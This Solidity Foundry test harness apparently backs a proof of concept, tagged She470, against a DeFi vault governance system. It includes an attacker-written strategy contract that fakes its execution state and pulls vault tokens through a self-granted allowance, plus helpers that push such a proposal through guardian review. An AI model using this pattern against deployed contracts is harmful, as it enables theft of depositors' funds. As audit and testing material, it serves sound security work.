// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {ProtocolFixture} from "../helpers/ProtocolFixture.sol";
import {ISyndicateGovernor} from "../../src/interfaces/ISyndicateGovernor.sol";
import {IGuardianRegistry} from "../../src/interfaces/IGuardianRegistry.sol";
import {BatchExecutorLib} from "../../src/BatchExecutorLib.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice Attacker-written "strategy": answers the IStrategy shape the factory probes and
///         nothing else. `executed()` is always false so `settleProposal`'s unwind check passes.
contract She470PullStrategy {
    address public immutable vault;
    address public immutable proposer;

    constructor(address vault_, address proposer_) {
        vault = vault_;
        proposer = proposer_;
    }

    function executed() external pure returns (bool) {
        return false;
    }

    /// @dev Batch leg: pulls under the allowance the same batch granted.
    function pull(address token, uint256 amount) external {
        IERC20(token).transferFrom(vault, address(this), amount);
    }

    /// @dev Permissionless donation back to the vault (no batch, no review).
    function push(address token, uint256 amount) external {
        IERC20(token).transfer(vault, amount);
    }

    function noop() external {}

    function sink() external payable {}

    receive() external payable {}
}

/// @notice Real-stack harness: `ProtocolFixture._deployProtocol` plus one staked guardian,
///         the owner registered as the vault's agent and funded for the proposer bond.
abstract contract She470Harness is ProtocolFixture {
    ProtocolDeployment internal p;
    address internal owner = makeAddr("owner");
    address internal guardian = makeAddr("guardian");
    address internal lp = makeAddr("lp");

    function _setUpProtocol() internal {
        p = _deployProtocol(owner);
        _registerAgent(owner);
        p.wood.mint(guardian, 100_000_000e18);
        vm.startPrank(guardian);
        p.wood.approve(address(p.swood), type(uint256).max);
        p.swood.stakeAsGuardian(100_000_000e18, 0);
        vm.stopPrank();
        vm.warp(vm.getBlockTimestamp() + 1);
    }

    function _registerAgent(address a) internal {
        uint256 id = p.agentRegistry.mint(a);
        vm.prank(owner);
        p.vault.registerAgent(id, a);
        p.wood.mint(a, 10_000_000e18);
        vm.prank(a);
        p.wood.approve(address(p.escrow), type(uint256).max);
    }

    function _deposit(address who, uint256 amt) internal returns (uint256 shares) {
        p.asset.mint(who, amt);
        vm.startPrank(who);
        p.asset.approve(address(p.vault), amt);
        shares = p.vault.deposit(amt, who);
        vm.stopPrank();
    }

    function _call(address t, bytes memory d) internal pure returns (BatchExecutorLib.Call memory) {
        return BatchExecutorLib.Call({target: t, data: d, value: 0});
    }

    function _propose(
        address proposer,
        address strategy,
        uint256 duration,
        uint256 maxCapital,
        uint16 ddBps,
        BatchExecutorLib.Call[] memory exec,
        uint256[] memory execCaps,
        BatchExecutorLib.Call[] memory settle,
        uint256[] memory settleCaps
    ) internal returns (uint256 pid) {
        ISyndicateGovernor.RiskEnvelope memory env =
            ISyndicateGovernor.RiskEnvelope({maxCapital: maxCapital, maxDrawdownBps: ddBps});
        ISyndicateGovernor.CoProposer[] memory none = new ISyndicateGovernor.CoProposer[](0);
        vm.prank(proposer);
        pid = p.governor
            .propose(address(p.vault), strategy, "ipfs://poc", duration, env, exec, execCaps, settle, settleCaps, none);
    }

    /// @dev No LP veto; the guardian approves with a lock sized to the coverage need (+20%), so one
    ///      budget covers several proposals; returns with the clock just past `reviewEnd`.
    function _passReview(uint256 pid) internal {
        ISyndicateGovernor.StrategyProposal memory pr = p.governor.getProposal(pid);
        vm.warp(pr.voteEnd + 1);
        uint256 needUsd = p.ledger.coverageUsd(address(p.asset), p.governor.getRequiredCoverage(pid));
        uint256 lock = (needUsd * 1e8 / p.ledger.woodPriceX8()) * 12 / 10 + 1e18;
        vm.prank(guardian);
        p.registry.voteOnProposal(address(p.governor), pid, IGuardianRegistry.GuardianVoteType.Approve, lock);
        vm.warp(pr.reviewEnd + 1);
    }

    function _passReviewAndExecute(uint256 pid) internal {
        _passReview(pid);
        p.governor.executeProposal(pid);
    }

    /// @dev Pull-then-noop proposal on `s`: execute `[approve(s, amt), s.pull(amt)]`, settle `[s.noop()]`.
    function _pullProposal(
        address proposer,
        She470PullStrategy s,
        uint256 amt,
        uint256 maxCapital,
        uint16 ddBps,
        uint256 duration
    ) internal returns (uint256 pid) {
        BatchExecutorLib.Call[] memory exec = new BatchExecutorLib.Call[](2);
        exec[0] = _call(address(p.asset), abi.encodeCall(IERC20.approve, (address(s), amt)));
        exec[1] = _call(address(s), abi.encodeCall(She470PullStrategy.pull, (address(p.asset), amt)));
        uint256[] memory execCaps = new uint256[](2);
        execCaps[1] = amt;
        BatchExecutorLib.Call[] memory settle = new BatchExecutorLib.Call[](1);
        settle[0] = _call(address(s), abi.encodeCall(She470PullStrategy.noop, ()));
        uint256[] memory settleCaps = new uint256[](1);
        pid = _propose(proposer, address(s), duration, maxCapital, ddBps, exec, execCaps, settle, settleCaps);
    }
}
